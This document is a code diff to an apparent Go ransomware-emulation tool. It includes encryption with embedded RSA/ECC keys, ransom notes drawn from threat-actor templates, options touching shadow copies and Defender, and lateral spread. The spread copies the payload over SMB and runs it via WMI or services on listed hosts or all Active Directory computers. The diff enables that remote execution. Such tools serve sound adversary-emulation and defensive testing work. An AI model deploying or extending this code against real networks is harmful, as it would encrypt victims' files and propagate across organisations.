@@ -18,11 +18,10 @@ import (
 // Category - Impact Related
 // TODO - Desktop Background Optional Capability
 // TODO - Icon Association Optional Capability
+// TODO - Allow for embedding a customized ransomware note
 // Category - Defense Evasion
 // TODO - Self-Delete
 // Category - Remote Execution
-// TODO - Remote Execution via schtask
-// TODO - Remote Execution via service control manager
 // TODO - Remote Execution via mcc COM
 // TODO - Remote Execution via Startup Folder
 // TODO - Remote Execution via reg autostart
@@ -48,9 +47,9 @@ var privateKeys embed.FS
 var eccPrivateKeyName = "ecc_key.ecc"
 var rsaPrivateKeyName = "rsa_key.rsa"
 
-var dummy_extensions = []string{"docx", "docm", "xlsm", "xlsx", "qbw", "rar", "csv", "sln", "bin", "zip", "pdf", "txt"}
-var subdir_names = []string{"finance", "reports", "documents", "it", "exhibits", "backup"}
-var file_names = []string{"workbook", "report", "export", "timesheet", "evidence", "knowledge", "system", "adjustment", "observable", "genuine", "certificates", "judgement", "corporate", "domain", "tempest", "research", "hypothesis", "parallel"}
+var dummy_extensions = []string{"docx", "docm", "xlsm", "xlsx", "qbw", "rar", "csv", "sln", "bin", "zip", "pdf", "txt", "pptx", "pptm", "msg", "xml", "json", "html", "eml", "dat", "accdb", "dotx", "dotm", "doc"}
+var subdir_names = []string{"finance", "reports", "documents", "it", "exhibits", "backup", "evidence", "research", "data", "files", "projects", "work", "hr", "itops", "ops", "devops", "engineering", "legal", "compliance", "hris"}
+var file_names = []string{"workbook", "report", "export", "timesheet", "evidence", "knowledge", "system", "adjustment", "observable", "genuine", "certificates", "judgement", "corporate", "domain", "tempest", "research", "hypothesis", "parallel", "analysis", "data", "report", "summary", "presentation", "document", "file", "spreadsheet", "database", "record", "evidence", "exhibit", "casefile", "project", "workbook", "export"}
 var subFileNames = []string{"base", "employee", "confidential", "sensitive", "markings", "delimited", "full", "temporary", "interim", "remarkable", "explicit", "absolute", "aws", "directreport", "hr", "it", "fin", "monthly", "quarterly", "daily"}
 
 func parseArgs(groups []RansomActor) (map[string]any, error) {
@@ -83,11 +82,13 @@ func parseArgs(groups []RansomActor) (map[string]any, error) {
 	var targetSlice StringSlice
 	flag.Var(&targetSlice, "targets", "A comma-separated list of hostnames/IP addresses - impact will be copied to the remote device via SMB and executed via the chosen method")
 	targetsFile := flag.String("targets_file", "", "Specify a file containing line-delimited hostnames/IPs to use as execution targets")
-	execMethod := flag.String("exec_method", "wmi", "How to execute remote copies of impact - wmi, task, service, reg, startup, mmc")
+	execMethod := flag.String("exec_method", "wmi", "How to execute remote copies of impact - wmi, service, task (TODO), reg (TODO), startup (TODO), mmc (TODO)")
 	targetNetworkShares := flag.Bool("targetNetworkShares", false, "If enabled, impact will target network shares if target_dir == \"*\"")
 	targetADComputers := flag.Bool("targetad", false, "If enabled, impact will target all enabled computers in the current domain - requires admin privileges")
 	remoteFileCopyPath := flag.String("remotecopypath", "", "If specified, impact will be copied to this location on the remote device - if blank, will use the default ADMIN$ share")
 	skipShares := flag.Bool("skipshares", false, "If enabled, impact will not target network shares")
+	//username := flag.String("username", "", "Username to use for remote execution - if blank, will use current user")
+	//password := flag.String("password", "", "Password to use for remote execution - if blank, will use current user")
 
 	// Asymmetric Keys
 	generate_keys := flag.Bool("generate_keys", false, "If specified, will generate new RSA/ECC keys to use for encryption/decryption purposes")
@@ -100,6 +101,9 @@ func parseArgs(groups []RansomActor) (map[string]any, error) {
 	create := flag.Bool("create", false, "Create a mixture of mock data files in the target directory")
 	create_count := flag.Int("create_files", 5000, "How many mock files to create")
 	create_size := flag.Int("create_size", 5000, "Size in megabytes of mock file data to create - distributed evenly across create_files count")
+
+	// General
+	// DEBUG Logging
 	flag.Parse()
 
 	// If we are not listing threat actor templates or ge
@@ -232,6 +236,12 @@ func parseArgs(groups []RansomActor) (map[string]any, error) {
 		return nil, errors.New("Cannot use -create and -target_file or -targets together")
 	}
 
+	if *create && *targetDirectory == "" {
+		if !doesOSEntryExist(*targetDirectory) {
+			return nil, errors.New(fmt.Sprintf("Target Directory does not exist: %s", *targetDirectory))
+		}
+	}
+
 	if *skipShares {
 		*targetNetworkShares = false
 	}
@@ -259,9 +269,9 @@ func parseArgs(groups []RansomActor) (map[string]any, error) {
 		"vss":                        *vss,
 		"encryption_percent":         *encryption_percent,
 		"threshold_auto_fullencrypt": *threshold_auto_fullencrypt,
-		"exec_method":                *execMethod,          // TODO
-		"targets":                    targetSlice,          // TODO
-		"targets_file":               *targetsFile,         // TODO
+		"exec_method":                *execMethod,
+		"targets":                    targetSlice,
+		"targets_file":               *targetsFile,
 		"targetNetworkShares":        *targetNetworkShares, // Not for manual use - network shares are auto-targeted when running locally - they are skipped when running remotely/auto-spread
 		"force_note_name":            *force_note_name,     // Should only be used for when we are copying impact and launching remotely on multiple devices
 		"force_extension":            *force_extension,     // Should only be used for when we are copying impact and launching remotely on multiple devices
@@ -270,6 +280,8 @@ func parseArgs(groups []RansomActor) (map[string]any, error) {
 		"defender":                   *defender,
 		"targetad":                   *targetADComputers,
 		"remoteFileCopyPath":         *remoteFileCopyPath,
+		//"username":                   *username,
+		//"password":                   *password,
 	}
 
 	return arguments, nil
@@ -345,6 +357,7 @@ func main() {
 	extension = replaceExtensionVariables(extension)
 	note := replaceExtensionVariables(group.Note)
 	noteName := group.Notes[rand.Intn(len(group.Notes))]
+	noteName = replaceExtensionVariables(noteName)
 	if args["force_note_name"].(string) != "" {
 		noteName = args["force_note_name"].(string)
 	}
@@ -430,6 +443,11 @@ func main() {
 	if len(remoteTargetList) != 0 {
 		handleRemoteTargets(remoteTargetList, args, extension, noteName, note, group, sym_cipher)
 		return
+		// If we are doing remote targets, we should not be doing anything locally
+	} else if args["targets_file"].(string) != "" || targetAD {
+		// Only way we end up here is if targets_file is blank or there is some type of failure to query AD
+		printFormattedMessage(fmt.Sprintf("Remote Target List is empty - no targets to execute on"), ERROR)
+		return
 	}
 
 	// We have valid group, directory, method at this point - now we want to determine if we are creating a subdir/files to simulate with or not
@@ -463,7 +481,9 @@ func main() {
 		}
 	}
 
-	generateDecryptInstructions(target_dir, asymKeys, sym_cipher, recursiveBool, noteName)
+	if !decryptEnabled {
+		generateDecryptInstructions(target_dir, asymKeys, sym_cipher, recursiveBool, noteName)
+	}
 
 	preEncryptionChecks(args, isAdmin, isRemoteDevice, config, decryptEnabled)
 
